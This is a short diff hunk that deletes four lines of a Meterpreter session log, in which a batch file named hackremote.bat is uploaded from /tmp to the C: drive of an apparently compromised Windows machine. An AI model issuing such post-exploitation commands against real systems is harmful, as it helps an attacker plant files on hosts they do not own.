@@ -1,4 +1,0 @@
-- meterpreter > upload /tmp/hackremote.bat c:\
-
-[*] uploading  : /tmp/hackremote.bat -> c:\
-[*] uploaded   : /tmp/hackremote.bat -> c:\\hackremote.bat
